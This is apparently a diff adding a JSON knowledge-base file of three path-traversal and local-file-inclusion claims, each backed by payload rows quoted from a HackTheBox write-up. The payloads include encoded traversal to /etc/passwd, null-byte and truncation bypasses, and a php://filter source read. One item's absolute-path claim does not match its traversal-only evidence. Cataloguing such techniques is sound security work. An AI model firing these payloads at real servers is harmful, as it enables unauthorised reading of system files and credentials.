@@ -1,0 +1,100 @@
+{
+  "class_id": "path_traversal",
+  "items": [
+    {
+      "item_key": "path_traversal.bypass.a_local_file_inclusion_filter_that_strips_is_bypasse",
+      "claim": "A local file inclusion filter that strips '../' is bypassed by re-encoding the traversal (%2e%2e%2f), because the filter matches the decoded form the request never carries.",
+      "kind": "bypass",
+      "body": "In practice on HTB this shows up as: | `/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64` | Bypass filters with URL encoding |\n| `/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]` | Bypass appended extension with path truncation (obsolete) |\n| `/index.php?language=../../../../etc/passwd%00` | Bypass appended extension with null byte (obsolete) |\n| `/index.php?language=php://filter/read=convert.base64-encode/resource=config` | Read PHP with base64 filter |\n\nWrite-up provenance: Esther7171/HackTheBox-Writeups-Walkthroughs :: Write-ups/Academy/05. Web Exploitation/28. File Inclusion/File Inclusion.md (973 words, classified web).",
+      "disproof": "Refuted when the server percent-decodes the parameter before filtering, in which case the encoded sequence is normalised to ../ and rejected; the bypass only exists where filtering happens on the raw, undecoded request value.",
+      "hunting_value": 3,
+      "sources": [
+        {
+          "url": "https://raw.githubusercontent.com/Esther7171/HackTheBox-Writeups-Walkthroughs/main/Write-ups/Academy/05.%20Web%20Exploitation/28.%20File%20Inclusion/File%20Inclusion.md",
+          "source_type": "writeup",
+          "host": "github.com",
+          "publisher": "github.com",
+          "quote": "| `/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64` | Bypass filters with URL encoding |\n| `/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]` | Bypass appended extension with path truncation (obsolete) |\n| `/index.php?language=../../../../etc/passwd%00` | Bypass appended extension with null byte (obsolete) |\n| `/index.php?language=php://filter/read=convert.base64-encode/resource=config` | Read PHP with base64 filter |"
+        },
+        {
+          "url": "https://portswigger.net/web-security/file-path-traversal",
+          "source_type": "research",
+          "host": "portswigger.net",
+          "publisher": "portswigger.net",
+          "quote": "path traversal"
+        }
+      ]
+    },
+    {
+      "item_key": "path_traversal.technique.including_an_attacker_influenced_path_lets_an_absolute_pat",
+      "claim": "Including an attacker-influenced path lets an absolute path such as /etc/passwd or the Windows hosts file be read without any traversal sequence at all.",
+      "kind": "technique",
+      "body": "In practice on HTB this shows up as: | `/index.php?language=....//....//....//....//etc/passwd` | Bypass basic path traversal filter |\n| `/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64` | Bypass filters with URL encoding |\n| `/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]` | Bypass appended extension with path truncation (obsolete) |\n| `/index.php?language=../../../../etc/passwd%00` | Bypass appended extension with null byte (obsolete) |\n\nWrite-up provenance: Esther7171/HackTheBox-Writeups-Walkthroughs :: Write-ups/Academy/05. Web Exploitation/28. File Inclusion/File Inclusion.md (973 words, classified web).",
+      "disproof": "Refuted when the application validates the path against an allow-list of permitted directories rather than rejecting traversal sequences, in which case an absolute path outside the allow-list is refused.",
+      "hunting_value": 3,
+      "sources": [
+        {
+          "url": "https://raw.githubusercontent.com/Esther7171/HackTheBox-Writeups-Walkthroughs/main/Write-ups/Academy/05.%20Web%20Exploitation/28.%20File%20Inclusion/File%20Inclusion.md",
+          "source_type": "writeup",
+          "host": "github.com",
+          "publisher": "github.com",
+          "quote": "| `/index.php?language=....//....//....//....//etc/passwd` | Bypass basic path traversal filter |\n| `/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64` | Bypass filters with URL encoding |\n| `/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]` | Bypass appended extension with path truncation (obsolete) |\n| `/index.php?language=../../../../etc/passwd%00` | Bypass appended extension with null byte (obsolete) |"
+        },
+        {
+          "url": "https://cwe.mitre.org/data/definitions/22.html",
+          "source_type": "research",
+          "host": "cwe.mitre.org",
+          "publisher": "mitre.org",
+          "quote": "path traversal"
+        },
+        {
+          "url": "https://portswigger.net/web-security/file-path-traversal",
+          "source_type": "research",
+          "host": "portswigger.net",
+          "publisher": "portswigger.net",
+          "quote": "path traversal"
+        }
+      ]
+    },
+    {
+      "item_key": "path_traversal.technique.php_filter_with_a_base64_encode_conversion_stream_reads",
+      "claim": "php://filter with a base64-encode conversion stream reads a PHP source file as base64, turning a file read into source disclosure that reveals credentials inside the code.",
+      "kind": "technique",
+      "body": "In practice on HTB this shows up as: | `/index.php?language=php://filter/read=convert.base64-encode/resource=config` | Read PHP with base64 filter |\n\nWrite-up provenance: Esther7171/HackTheBox-Writeups-Walkthroughs :: Write-ups/Academy/05. Web Exploitation/28. File Inclusion/File Inclusion.md (973 words, classified web).",
+      "disproof": "Refuted when the wrapper scheme is disabled or the allow-list excludes any path containing a stream wrapper, in which case the request returns no source text.",
+      "hunting_value": 3,
+      "sources": [
+        {
+          "url": "https://raw.githubusercontent.com/Esther7171/HackTheBox-Writeups-Walkthroughs/main/Write-ups/Academy/05.%20Web%20Exploitation/28.%20File%20Inclusion/File%20Inclusion.md",
+          "source_type": "writeup",
+          "host": "github.com",
+          "publisher": "github.com",
+          "quote": "| `/index.php?language=php://filter/read=convert.base64-encode/resource=config` | Read PHP with base64 filter |"
+        },
+        {
+          "url": "https://portswigger.net/web-security/file-path-traversal",
+          "source_type": "research",
+          "host": "portswigger.net",
+          "publisher": "portswigger.net",
+          "quote": "path traversal"
+        }
+      ]
+    }
+  ],
+  "publishers": [
+    "github.com",
+    "mitre.org",
+    "portswigger.net"
+  ],
+  "publishers_used": [
+    "github.com",
+    "mitre.org",
+    "portswigger.net"
+  ],
+  "sources": [
+    "https://cwe.mitre.org/data/definitions/22.html",
+    "https://portswigger.net/web-security/file-path-traversal",
+    "https://raw.githubusercontent.com/Esther7171/HackTheBox-Writeups-Walkthroughs/main/Write-ups/Academy/05.%20Web%20Exploitation/28.%20File%20Inclusion/File%20Inclusion.md"
+  ]
+}
+// COMPLETE 3
